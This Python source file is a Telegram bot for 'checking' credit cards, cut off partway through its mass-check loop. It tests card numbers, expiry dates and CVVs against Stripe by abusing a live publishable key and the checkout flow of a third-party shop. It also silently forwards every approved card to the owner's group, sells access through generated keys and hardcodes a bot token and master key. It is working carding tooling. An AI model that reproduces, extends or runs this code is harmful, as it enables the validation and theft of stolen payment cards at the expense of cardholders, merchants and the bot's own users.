import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urlencode
import json
import os
import time
import asyncio # Added for non-blocking sleep (used with asyncio.to_thread)
import secrets # For generating secure keys
import datetime # For handling timeframes
import logging
import csv # Added for CSV file handling
from io import StringIO # Added for reading CSV from string in case of future direct file access

# Enable logging and configure levels
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("httpx").setLevel(logging.WARNING) # Keep for python-telegram-bot internal use

logger = logging.getLogger(__name__)

# --- Global In-Memory Storage for Generated Keys ---
# This data will be lost if the bot process restarts.
VALID_SECRET_KEY = "#wizard@de234" 
generated_keys = {
    VALID_SECRET_KEY: {'expiry': datetime.datetime.max, 'generated_by': 'Admin'} 
}

# --- Payment Gateway and Security Definitions for .gates command ---
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersourse",
    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
    "Moneris", "recurly", "cardknox", "payeezy", "matt sorra", "ebizcharge",
    "payflow", "Chargify", "payflow", "Paytrace", "hostedpayments", "securepay",
    "eWay", "blackbaud", "LawPay", "clover", "cardconnect", "bluepay", "fluidpay",
    "Worldpay", "Ebiz", "chasepaymentech", "cardknox", "2checkout", "Auruspay",
    "sagepayments", "paycomet", "geomerchant", "realexpayments",
    "Rocketgateway", "Rocketgate", "Rocket", "Auth.net", "Authnet", "rocketgate.com",
    "Shopify", "WooCommerce", "BigCommerce", "Magento Payments",
    "OpenCart", "PrestaShop", "Razorpay"
]

SECURITY_INDICATORS = {
    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com']
}

# --- Global In-Memory Storage for BIN Data from CSV ---
# This will store the loaded BIN data, keyed by BIN number.
bin_data_from_csv = {}

def load_bin_data_from_csv(file_path="bin-list-data.csv"):
    """
    Loads BIN data from a CSV file into a global dictionary.
    Assumes CSV format: BIN,SCHEME,TYPE,BRAND,BANK_NAME,BANK_URL,BANK_PHONE,COUNTRY_CODE,CURRENCY_CODE,COUNTRY_NAME
    (Columns 5 and 6 (BANK_URL, BANK_PHONE) might be empty based on example)
    """
    global bin_data_from_csv
    bin_data_from_csv = {} # Clear existing data
    try:
        with open(file_path, mode='r', newline='', encoding='utf-8') as csvfile:
            reader = csv.reader(csvfile) # Use csv.reader for positional access
            for row in reader:
                if not row or not row[0].strip(): # Skip empty rows or rows with empty first column
                    continue
                try:
                    bin_number = row[0].strip()
                    if not bin_number.isdigit(): # Basic check if it's a valid BIN
                        logger.warning(f"Skipping row due to non-digit BIN in first column: {row}")
                        continue

                    # Map columns based on the user-provided example format:
                    # 511708,MASTERCARD,CREDIT,STANDARD,"BANCO BRADESCARD, S.A.",,,BR,BRA,BRAZI
                    # 0        1         2      3          4                      5  6  7    8    9
                    scheme = row[1].strip() if len(row) > 1 else 'N/A'
                    card_type = row[2].strip() if len(row) > 2 else 'N/A'
                    brand = row[3].strip() if len(row) > 3 else 'N/A'
                    bank_name = row[4].strip() if len(row) > 4 else 'N/A'
                    bank_url = row[5].strip() if len(row) > 5 else 'N/A'
                    bank_phone = row[6].strip() if len(row) > 6 else 'N/A'
                    country_code_short = row[7].strip() if len(row) > 7 else 'N/A' # 'BR'
                    currency_code = row[8].strip() if len(row) > 8 else 'N/A'
                    country_name = row[9].strip() if len(row) > 9 else 'N/A' # 'BRAZI'

                    # For country emoji, we don't have it directly in the CSV.
                    # We'll leave it empty unless a mapping is provided later.
                    country_emoji = '' 

                    bin_data_from_csv[bin_number] = {
                        'scheme': scheme,
                        'type': card_type,
                        'brand': brand,
                        'prepaid': 'N/A', # Not available in provided CSV format
                        'country_name': country_name,
                        'country_emoji': country_emoji,
                        'currency_code': currency_code,
                        'bank_name': bank_name,
                        'bank_url': bank_url,
                        'bank_phone': bank_phone,
                        'bank_city': 'N/A', # Not available in provided CSV format
                        'valid': True
                    }
                except IndexError:
                    logger.warning(f"Skipping malformed row (not enough columns or unexpected format): {row}")
                except Exception as row_e:
                    logger.warning(f"Error processing row {row}: {row_e}")

        logger.info(f"Successfully loaded {len(bin_data_from_csv)} BIN entries from {file_path}")
        return True
    except FileNotFoundError:
        logger.error(f"BIN data file not found: {file_path}. BIN lookup will not work.")
        return False
    except Exception as e:
        logger.error(f"An unexpected error occurred while loading BIN data from CSV: {e}")
        return False


# --- Card Checker Functions ---

def extract_nonce(response_text, url):
    """
    Extracts various types of nonces (security tokens) from HTML content.
    Prioritizes woocommerce-process-checkout-nonce, then stripe-related nonces,
    then generic script nonces.
    """
    soup = BeautifulSoup(response_text, 'html.parser')
    checkout_nonce = soup.find('input', {'name': 'woocommerce-process-checkout-nonce'})
    if checkout_nonce:
        return checkout_nonce['value']
    
    stripe_nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
    if stripe_nonce_match:
        return stripe_nonce_match.group(1)
    
    script_nonce_match = re.search(r'"nonce":"([^"]+)"', response_text)
    if script_nonce_match:
        return script_nonce_match.group(1)
    
    raise ValueError(f"Could not find any nonce on {url}")

def create_payment_method(cc, m, y, cvv):
    """
    Attempts to create a Stripe payment method using the provided credit card details.
    Returns the payment method ID if successful, otherwise None.
    Uses requests for synchronous operations.
    """
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-IN',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': y,
        'card[exp_month]': m,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'IN',
        'payment_user_agent': 'stripe.js/2b425ea933; stripe-js-v3/2b425ea933; payment-element; deferred-intent',
        'referrer': 'https://radio-tecs.com',
        'time_on_page': '57018',
        'client_attribution_metadata[client_session_id]': 'a05ac5c7-6aaa-4abd-9ac7-8b5ab40ebd1b',
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'guid': '205dda56-6eb9-46f4-8609-e3addd479f0c177bc7',
        'muid': 'ebfc2dae-07ec-48dc-a474-5de8f917b8aa7b2f88',
        'sid': 'd158565f-7ea3-46e9-8587-cef28ce35fab191ba2',
        'key': 'pk_live_51JRJFgJNjZL6EJkQHeYkzBEpfeXNg9qADJwvdvXWpA3a2Dzl6TXIQwOLC3dyb56lGKSPNm8a0nTL8PlqFrHejIop00DUXcrpCK',
        '_stripe_version': '2024-06-20',
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        response.raise_for_status()
        return response.json().get('id')
    except requests.exceptions.RequestException as e:
        print(f"Payment method creation failed for {cc}: Request error - {str(e)}")
        return None
    except Exception as e:
        print(f"Error creating payment method for {cc}: {str(e)}")
        return None

def create_setup_intent(payment_method_id, cc):
    """
    Attempts to create a Stripe setup intent using the payment method ID.
    This simulates a transaction attempt to check card validity.
    Returns the JSON response from the setup intent creation if successful, otherwise None.
    Uses requests for synchronous operations.
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    })

    checkout_url = "https://radio-tecs.com/checkout/"
    try:
        response = session.get(checkout_url, timeout=10)
        response.raise_for_status()
        nonce = extract_nonce(response.text, checkout_url)
    except requests.exceptions.RequestException as e:
        print(f"Failed to get checkout page for {cc}: Request error - {str(e)}")
        return None
    except Exception as e:
        print(f"Failed to get checkout page for {cc}: {str(e)}")
        return None

    url = "https://radio-tecs.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    data = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": payment_method_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce,
    }

    try:
        response = session.post(
            url,
            data=urlencode(data),
            headers={"Referer": checkout_url},
            timeout=10
        )
        
        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                print(f"Invalid JSON response from setup intent creation for {cc}")
                return None
        else:
            print(f"Setup intent creation failed for {cc}: {response.status_code} - {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {cc}: {str(e)}")
        return None
    except Exception as e:
        print(f"Error creating setup intent for {cc}: {str(e)}")
        return None

def process_cc(ccc):
    """
    Processes a single credit card string (CC|MM|YYYY|CVV) to check its validity.
    Orchestrates the creation of payment method and setup intent synchronously.
    Returns the result of the setup intent or None if an error occurs.
    """
    try:
        cc, m, y, cvv = ccc.split("|")
        # Handle year format, e.g., '2025' to '25'
        y = y.replace("20", "") if y.startswith("20") else y
        
        print(f"\nProcessing: {cc}|{m}|{y}|{cvv}")
        
        payment_method_id = create_payment_method(cc, m, y, cvv)
        if not payment_method_id:
            return None
            
        result = create_setup_intent(payment_method_id, cc)
        return result
        
    except Exception as e:
        print(f"Error processing {ccc}: {str(e)}")
        return None


# --- BIN Lookup Function using local CSV data ---
def get_bin_details_local(bin_number: str):
    """
    Fetches BIN details from the locally loaded CSV data.
    Returns a dictionary of details or None if the BIN is not found.
    """
    # Ensure BIN is cleaned to match keys in the dictionary (e.g., remove spaces)
    cleaned_bin = bin_number.strip() 

    # Check if the BIN data was loaded successfully
    if not bin_data_from_csv:
        logger.warning("BIN data not loaded from CSV. Cannot perform local BIN lookup.")
        return {'valid': False, 'message': 'BIN data not loaded. Please ensure bin-list-data.csv is in the bot\'s folder.'}

    # Look up the BIN in the loaded data
    details = bin_data_from_csv.get(cleaned_bin)
    
    if details:
        # Return a copy to prevent external modification of the stored data
        return details.copy() 
    else:
        logger.info(f"BIN {cleaned_bin} not found in local CSV data.")
        return {'valid': False, 'message': 'BIN not found in local database.'}


# --- Telegram Bot integration starts here ---

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Replace with your actual bot token obtained from BotFather
# It's recommended to load this from an environment variable for security in production.
BOT_TOKEN = "7695926873:AAGUgkxDBAbZGiQ9elMLqslulBPI_AG4AzQ" 
# The Telegram User ID where approved cards will be sent
# IMPORTANT: This ID must be an integer (e.g., -1234567890 for a group, or a positive number for a user)
OWNER_CHAT_ID = -4979374416 

# Define the owner's Telegram handle
OWNER_HANDLE = "@nexaxbot"

# The Telegram User ID that has admin privileges for commands like .generate
# IMPORTANT: This must be YOUR PERSONAL TELEGRAM USER ID (a positive integer).
# To find your user ID, message @userinfobot on Telegram.
ADMIN_USER_ID = 7287885938 


async def is_admin_or_master_key_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """
    Checks if the current user is the ADMIN_USER_ID or is authenticated with the VALID_SECRET_KEY.
    Returns True if either condition is met, False otherwise.
    """
    user_id = update.effective_user.id
    authenticated_key = context.user_data.get('authenticated_key')

    if user_id == ADMIN_USER_ID:
        return True
    
    # Check if the authenticated key is the master key
    if authenticated_key == VALID_SECRET_KEY:
        return True

    return False


async def get_instructions_message(user_mention_html: str) -> str:
    """Helper function to return the formatted instructions message."""
    return (
        f"Hi {user_mention_html}! 👋\n\n"
        "I'm your card checker bot. Here's how to use me:\n\n"
        "<b>Authentication:</b>\n"
        "To use the bot, you need to authenticate first. Send:\n"
        "<code>/auth YOUR_SECRET_KEY</code> OR <code>.auth YOUR_SECRET_KEY</code>\n"
        "Replace <code>YOUR_SECRET_KEY</code> with the key provided by the owner. "
        f"If you don't have one, please contact {OWNER_HANDLE}.\n\n"
        "<b>Single Card Check:</b>\n"
        "Send me the details in the following format:\n"
        "<code>.chk 16digitnum|month|year|cvv</code> OR <code>/chk 16digitnum\\month\\year\\cvv</code>\n"
        "For example: <code>.chk 1234567890123456|12|2025|123</code>\n"
        "<i>(Note: Non-admin users have a 30-second cooldown per check.)</i>\n\n"
        "<b>Mass Card Check:</b>\n"
        "Send me <code>.masscheck</code> OR <code>/masscheck</code> followed by multiple lines of card details, one per line.\n"
        "Example:\n"
        "<code>.masscheck</code>\n"
        "<code>1234567890123456|12|2025|123</code>\n"
        "<code>9876543210987654\\01\\2026\\456</code>\n"
        "And so on...\n"
        "<i>(Note: Non-admin users can check a maximum of 10 cards per mass check.)</i>\n\n"
        "<b>BIN Lookup:</b>\n"
        "Get detailed information about a BIN from the bot's local database. Send:\n"
        "<code>.bin 6digitBIN</code> OR <code>/bin 6digitBIN</code>\n"
        "For example: <code>.bin 457173</code>\n\n"
        "<b>Gateway Checker:</b>\n"
        "Send me <code>.gates YOUR_URL</code> OR <code>/gates YOUR_URL</code> to check for payment gateways and security on a website.\n"
        "For example: <code>.gates example.com</code>\n\n"
        "<b>Cancel Check:</b>\n"
        "To stop an ongoing mass check, send <code>.cancel</code> or <code>/cancel</code>.\n\n"
        "<b>Help:</b>\n"
        "To see these instructions again, send <code>.help</code> or <code>/help</code>.\n\n"
        "<b>Admin Command (Owner Only):</b>\n"
        "To generate a new key: <code>.generate &lt;VALIDITY&gt;</code> (e.g., <code>.generate 24H</code>, <code>.generate 7DAY</code>, <code>.generate 30DAY</code>)\n"
        "To remove a key: <code>.remove &lt;KEY_TO_REMOVE&gt;</code>\n"
        "To view registered keys: <code>.list_keys</code>\n"
    )

async def check_authentication(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Checks if the user is authenticated with a valid, non-expired key. If not, sends a message and returns False."""
    user_id = update.effective_user.id
    authenticated_key = context.user_data.get('authenticated_key')

    # If it's an admin or master key user, they are always authenticated
    if await is_admin_or_master_key_user(update, context):
        return True

    # For regular users, check their key in the in-memory dictionary
    if authenticated_key and authenticated_key in generated_keys:
        key_info = generated_keys[authenticated_key]
        if datetime.datetime.now() < key_info['expiry']:
            return True
        else:
            del generated_keys[authenticated_key] # Remove expired key
            context.user_data['authenticated_key'] = None # Clear user's key
            await update.message.reply_html(
                "🚫 <b>Your key has expired!</b> Please obtain a new key to continue using the bot. "
                f"Contact {OWNER_HANDLE} for assistance."
            )
    
    # If not authenticated, or key was expired
    await update.message.reply_html(
        "🚫 <b>Access Denied!</b> You need to authenticate first. "
        "Use <code>/auth YOUR_SECRET_KEY</code> to gain access. "
        f"If you don't have a key, please contact {OWNER_HANDLE}."
    )
    return False

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a welcome message and instructions when the /start command is issued."""
    user = update.effective_user
    await update.message.reply_html(await get_instructions_message(user.mention_html()))

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends instructions when the /help or .help command is issued."""
    user = update.effective_user
    await update.message.reply_html(await get_instructions_message(user.mention_html()))

async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handles the /auth or .auth command for user authentication."""
    parts = update.message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_html(
            "❌ <b>Invalid usage!</b> Please provide your secret key. "
            "Example: <code>/auth YOUR_SECRET_KEY</code>"
        )
        return

    user_key = parts[1]

    if user_key in generated_keys:
        key_info = generated_keys[user_key]
        if datetime.datetime.now() < key_info['expiry']:
            context.user_data['authenticated_key'] = user_key
            await update.message.reply_html(f"✅ <b>Authentication successful!</b> You are authenticated until {key_info['expiry'].strftime('%Y-%m-%d %H:%M:%S UTC')}.")
            return
        else:
            del generated_keys[user_key] # Remove expired key
            await update.message.reply_html(
                "❌ <b>Your key has expired!</b> Please obtain a new key. "
                f"Contact {OWNER_HANDLE} for assistance."
            )
            return
    else:
        await update.message.reply_html(
            "❌ <b>Invalid Secret Key!</b> Please check your key or contact "
            f"{OWNER_HANDLE} if you don't have one."
        )

async def generate_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the .generate or /generate command for admin to generate keys.
    Restricted to ADMIN_USER_ID.
    """
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_html(
            "🚫 <b>Access Denied!</b> This command is only for the bot owner. "
            f"If you need a key, please contact {OWNER_HANDLE}."
        )
        return
    
    parts = update.message.text.strip().split(maxsplit=1)
    
    if len(parts) < 2:
        await update.message.reply_html(
            "❌ <b>Invalid usage!</b> Admin, please specify the validity period. "
            "Example: <code>.generate 24H</code>, <code>.generate 7DAY</code>, <code>.generate 30DAY</code>"
        )
        return
    
    validity_period = parts[1].upper()
    expiry_time = datetime.datetime.now()
    
    if validity_period == '24H':
        expiry_time += datetime.timedelta(hours=24)
    elif validity_period == '7DAY':
        expiry_time += datetime.timedelta(days=7)
    elif validity_period == '30DAY':
        expiry_time += datetime.timedelta(days=30)
    else:
        await update.message.reply_html(
            "❌ <b>Invalid validity period!</b> Admin, please use <code>24H</code>, <code>7DAY</code>, or <code>30DAY</code>."
        )
        return

    new_key = secrets.token_urlsafe(16) # Generate a 16-character URL-safe random string
    generated_keys[new_key] = {
        'expiry': expiry_time,
        'generated_by': update.effective_user.id
    }
    
    await update.message.reply_html(
        f"✅ <b>New Key Generated!</b>\n"
        f"Key: <code>{new_key}</code>\n"
        f"Expires: <b>{expiry_time.strftime('%Y-%m-%d %H:%M:%S UTC')}</b>"
    )
    logger.info(f"Admin {update.effective_user.id} generated a key: {new_key} valid until {expiry_time}")


async def remove_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the .remove or /remove command for admin to remove a key.
    Restricted to ADMIN_USER_ID.
    """
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_html(
            "🚫 <b>Access Denied!</b> This command is only for the bot owner."
        )
        return

    parts = update.message.text.strip().split(maxsplit=1)
    if len(parts) < 2:
        await update.message.reply_html(
            "❌ <b>Invalid usage!</b> Admin, please specify the key to remove. "
            "Example: <code>.remove YOUR_KEY_HERE</code>"
        )
        return

    key_to_remove = parts[1].strip()

    if key_to_remove == VALID_SECRET_KEY:
        await update.message.reply_html("❌ <b>Cannot remove the master key.</b>")
        return

    if key_to_remove in generated_keys:
        del generated_keys[key_to_remove]
        await update.message.reply_html(f"✅ Key <code>{key_to_remove}</code> has been successfully <b>removed</b>.")
        logger.info(f"Admin {update.effective_user.id} removed key: {key_to_remove}")
    else:
        await update.message.reply_html(f"⚠️ Key <code>{key_to_remove}</code> not found or already expired/removed.")

async def list_keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles the .list_keys command for admin to list all generated keys and their details from in-memory storage.
    Restricted to ADMIN_USER_ID.
    """
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_html(
            "🚫 <b>Access Denied!</b> This command is only for the bot owner."
        )
        return

    if not generated_keys:
        await update.message.reply_html("There are no generated keys in memory (excluding the master key).")
        return

    response_messages = ["🔑 <b>Currently Generated Keys (In-Memory):</b>"]
    for key, info in generated_keys.items():
        # Skip the master key unless explicitly requested or for full transparency (optional)
        if key == VALID_SECRET_KEY:
            continue
        
        expiry_str = info['expiry'].strftime('%Y-%m-%d %H:%M:%S UTC')
        if datetime.datetime.now() >= info['expiry']:
            expiry_str += " (EXPIRED)"
        
        gen_by = info.get('generated_by', 'Unknown Admin')

        response_messages.append(
            f"\n<b>Key:</b> <code>{key}</code>\n"
            f"  <b>Expires:</b> {expiry_str}\n"
            f"  <b>Generated By:</b> {gen_by}"
        )
    
    if len(response_messages) == 1: # Only header if no other keys
        await update.message.reply_html("There are no generated keys in memory (excluding the master key).")
        return

    final_message = "\n".join(response_messages)
    if len(final_message) > 4096:
        final_message = final_message[:4000] + "\n... (List truncated due to length limit)"
        await update.message.reply_html("⚠️ List too long. Sending truncated list.")

    await update.message.reply_html(final_message)


async def check_card_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Processes incoming messages that start with '.chk' or '/chk' to check a single card validity.
    Includes a 30-second cooldown for non-admin users.
    """
    # Authenticate the user first. If not authenticated, the function will return False and send a message.
    if not await check_authentication(update, context):
        return

    # Apply 30-second cooldown for non-admin users
    # Admin users (ADMIN_USER_ID or those with VALID_SECRET_KEY) bypass this cooldown
    if not await is_admin_or_master_key_user(update, context):
        user_id = update.effective_user.id
        current_time = time.monotonic()
        last_check_time = context.user_data.get(f'last_chk_time_{user_id}', 0)

        if (current_time - last_check_time) < 30:
            remaining_time = int(30 - (current_time - last_check_time))
            await update.message.reply_html(
                f"⏳ <b>Cooldown active!</b> Please wait {remaining_time} seconds before checking another card."
            )
            return
        context.user_data[f'last_chk_time_{user_id}'] = current_time


    message_text = update.message.text
    chat_id = update.message.chat_id
    logger.info(f"Received message from {chat_id}: {message_text}")

    # Start timer for the check
    start_time = time.monotonic()

    # Extract the card details by removing '.chk' or '/chk' prefix
    if message_text.lower().startswith(".chk"):
        card_details_str = message_text[len(".chk"):].strip()
    elif message_text.lower().startswith("/chk"):
        card_details_str = message_text[len("/chk"):].strip()
    else:
        # This case should ideally not be hit if filters are set correctly
        return

    # Store original for forwarding (full string)
    original_card_input = card_details_str 
    # Replace backslashes with pipes for consistent internal processing
    card_details_str = card_details_str.replace('\\', '|')

    # Extract only the 16-digit card number for BIN display
    card_number_prefix = card_details_str.split('|')[0]
    bin_number = card_number_prefix[:6] # Extract BIN

    # Basic validation for format with pipes
    if not re.match(r"^\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", card_details_str):
        await update.message.reply_html(
            "❌ <b>Invalid format!</b> Please use <code>.chk 16digitnum|month|year|cvv</code> OR <code>/chk 16digitnum\\month\\year\\cvv</code>."
        )
        return

    # Send the initial "checking" message and store its ID
    checking_message = await update.message.reply_html("⏳ Checking your card, please wait...")
    
    # Call your existing processing logic (run synchronously in a separate thread)
    result = await asyncio.to_thread(process_cc, card_details_str)
    # Use local BIN lookup function
    bin_details = get_bin_details_local(bin_number)

    # End timer for the check
    end_time = time.monotonic()
    elapsed_time = end_time - start_time

    # Delete the "checking" message
    try:
        await checking_message.delete()
    except Exception as e:
        logger.warning(f"Could not delete checking message {checking_message.message_id}: {e}")

    # Prepare the formatted response message
    response_message_parts = []
    status_emoji = ""
    status_header = ""
    result_detail = ""

    if result is None:
        status_emoji = "⚫"
        status_header = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐒𝐭𝐚𝐭𝐮𝐬"
        result_detail = "Failed to process (site/service might be down or unreachable)." 
    elif result.get("success"):
        status_emoji = "✅"
        status_header = "𝐀𝐩𝐩𝐫�𝐯𝐞𝐝"
        result_detail = "The card appears to be valid."
        # Forward approved card details (full original input) to owner's group
        try:
            await context.bot.send_message(
                chat_id=OWNER_CHAT_ID,
                text=f"✅ Approved Card (User: {update.effective_user.mention_html()} | User ID: {update.effective_user.id}):\n<code>{original_card_input}</code>",
                parse_mode='HTML'
            )
            logger.info(f"Approved Card {original_card_input} sent to owner.")
        except Exception as e:
            logger.error(f"Failed to send approved card {original_card_input} to owner: {e}")
            # Removed the user-facing notification about forwarding failure
    elif "data" in result and "error" in result["data"]:
        status_emoji = "❌"
        status_header = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        error_message = result['data']['error']['message']
        # Attempt to get decline_code, default to N/A if not present
        decline_code = result['data']['error'].get('decline_code', 'N/A')
        result_detail = f"{error_message} ({decline_code} : {error_message})"
    else:
        status_emoji = "⚠️"
        status_header = "𝐔𝐧𝐤𝐧𝐨𝐰𝐧"
        result_detail = "Unknown response from the checker."
    
    # Construct the formatted message based on the specified format
    response_message_parts.append(f"{status_header} {status_emoji}")
    response_message_parts.append("    ") # Intentional space for formatting
    response_message_parts.append(f"𝐂𝐚𝐫𝐝 ➜ <code>{original_card_input}</code>")
    response_message_parts.append(f"𝐑𝐞𝐬𝐮?𝐭 ➜ {result_detail}")
    response_message_parts.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ Stripe")
    response_message_parts.append(f"𝐁𝐈𝐍 ➜ <code>{bin_number}</code>")

    # Add BIN details if available
    if bin_details and bin_details['valid']:
        response_message_parts.append(f"<b>BIN Details (from local data):</b> {bin_details['country_emoji']}")
        response_message_parts.append(f"  <b>Scheme:</b> <i>{bin_details['scheme']}</i>")
        response_message_parts.append(f"  <b>Type:</b> <i>{bin_details['type']}</i>")
        response_message_parts.append(f"  <b>Brand:</b> <i>{bin_details['brand']}</i>")
        response_message_parts.append(f"  <b>Prepaid:</b> <i>{bin_details['prepaid']}</i>")
        response_message_parts.append(f"  <b>Country:</b> <i>{bin_details['country_name']} ({bin_details['currency_code']})</i>")
        response_message_parts.append(f"  <b>Bank:</b> <i>{bin_details['bank_name']} ({bin_details['bank_city']})</i>")
        if bin_details['bank_url'] != 'N/A':
            response_message_parts.append(f"  <b>Bank URL:</b> <i>{bin_details['bank_url']}</i>")
        if bin_details['bank_phone'] != 'N/A':
            response_message_parts.append(f"  <b>Bank Phone:</b> <i>{bin_details['bank_phone']}</i>")
    elif bin_details and not bin_details['valid']:
        response_message_parts.append(f"<b>BIN Details:</b> <i>{bin_details['message']}</i>")
    else:
        response_message_parts.append(f"<b>BIN Details:</b> <i>Not found in local database.</i>")


    response_message_parts.append(f"CHECKED BY - {OWNER_HANDLE}") # Using the owner's handle directly
    response_message_parts.append(f"𝐓𝐢𝐦𝐞 {elapsed_time:.1f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬")

    final_response_message = "\n".join(response_message_parts)
    
    await update.message.reply_html(final_response_message)


async def mass_check_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Processes incoming messages that start with '.masscheck' or '/masscheck' to check multiple cards.
    Sends status for each card individually. After all checks, deletes individual messages and sends a summary.
    Includes a limit of 10 cards for non-admin users.
    """
    if not await check_authentication(update, context):
        return

    message_text = update.message.text
    chat_id = update.message.chat_id
    logger.info(f"Received mass check message from {chat_id}: {message_text}")

    # Clear any previous cancellation requests for this chat
    context.user_data['cancel_mass_check'] = False

    # Extract the command and card lines
    command_prefix_len = len(".masscheck") if message_text.lower().startswith(".masscheck") else len("/masscheck")
    card_lines_raw = message_text[command_prefix_len:].strip().split('\n')
    
    # Filter empty lines
    card_lines = [line.strip() for line in card_lines_raw if line.strip()]

    # Apply 10-card limit for non-admin users
    # Admin users (ADMIN_USER_ID or those with VALID_SECRET_KEY) bypass this limit
    if not await is_admin_or_master_key_user(update, context):
        if len(card_lines) > 10:
            await update.message.reply_html(
                "❌ <b>Too many cards!</b> Non-admin users can check a maximum of 10 cards per mass check."
            )
            return

    if not card_lines:
        await update.message.reply_html(
            "❌ <b>No card details found</b> after <code>.masscheck</code> or <code>/masscheck</code>. "
            "Please provide them on separate lines after the command."
        )
        return

    # Send the initial "initiating" message
    initial_mass_check_message = await update.message.reply_html(
        f"⏳ Initiating mass check for <b>{len(card_lines)} card(s)</b>. "
        f"I will send individual updates for each, then a summary.\n\n"
        f"Send <code>.cancel</code> or <code>/cancel</code> to stop at any time."
    )
    
    # List to store message IDs of individual updates to delete later
    individual_update_message_ids = []
    # List to store results for the final summary message
    all_card_results_for_summary = []

    # Initialize counters for summary
    approved_count = 0
    declined_count = 0
    unknown_count = 0
    start_time = time.monotonic() # Start time for total duration

    for i, line in enumerate(card_lines):
        # Explicitly check for cancellation request *before* starting processing for this card
        if context.user_data.get('cancel_mass_check'):
            await update.message.reply_html("🚫 <b>Mass check cancelled by user.</b>")
            context.user_data['cancel_mass_check'] = False # Reset flag
            
            # Delete any remaining individual update messages
            for msg_id in individual_update_message_ids:
                try:
                    await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception as e:
                    logger.warning(f"Could not delete message {msg_id} during cancellation: {e}")
            
            # Delete the initial "initiating mass check" message
            try:
                await initial_mass_check_message.delete()
            except Exception as e:
                logger.warning(f"Could not delete initial mass check message {initial_mass_check_message.message_id}: {e}")
            return

        # Store original line for forwarding (full string)
        original_line_input = line 
        # Replace backslashes with pipes for consistent internal processing
        processed_line = line.replace('\\', '|')
        
        # Extract only the 16-digit card number for BIN display
        bin_number = processed_line.split('|')[0][:6] 

        # Prepare a message for the current card being processed
        status_prefix = f"Checking card <b>{i+1}/{len(card_lines)}</b> (<code>{line}</code>): "

        # Validate format before processing
        if not re.match(r"^\d{16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$", processed_line):
            invalid_format_message = await update.message.reply_html(f"{status_prefix}❌ <b>Invalid format!</b>")
            individual_update_message_ids.append(invalid_format_message.message_id)
            all_card_results_for_summary.append(f"❌ <code>{line}</code>: Invalid format.")
            unknown_count += 1 
            await asyncio.sleep(0.5) # Short delay to avoid flooding if many invalid
            continue 

        # Process the card (run synchronously in a separate thread)
